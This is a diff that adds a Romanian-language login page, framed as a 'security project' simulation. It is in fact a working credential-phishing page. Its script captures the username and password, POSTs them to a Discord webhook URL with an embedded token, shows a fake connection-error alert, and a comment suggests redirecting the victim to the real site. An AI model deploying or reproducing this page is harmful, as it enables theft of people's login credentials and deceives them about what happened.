@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <title>Autentificare - Proiect Securitate</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; }
+        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #166fe5; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <h3>Autentificare</h3>
+        <form id="loginForm">
+            <label>Utilizator sau Email</label>
+            <input type="text" id="username" required>
+            
+            <label>Parolă</label>
+            <input type="password" id="password" required>
+            
+            <button type="submit">Conectare</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            // Înlocuiește mai jos cu Webhook URL-ul tău de la Discord
+            const webhookURL = "https://discord.com/api/webhooks/1569020282591641710/aU4qpN4_6eQFCJXaGdH61VK2r0KTBGlNNfvc-cusT8PruX_WrigAcxHD99h7WOAlFaW1";
+            
+            const payload = {
+                content: `🚨 **Date capturate în simulare:**\n- **Utilizator:** \`${user}\`\n- **Parolă:** \`${pass}\``
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert("Eroare de conexiune. Vă rugăm încercați din nou mai târziu.");
+                // Opțional, poți redirecționa victima către site-ul real după aceea
+            });
+        });
+    </script>
+
+</body>
+</html>
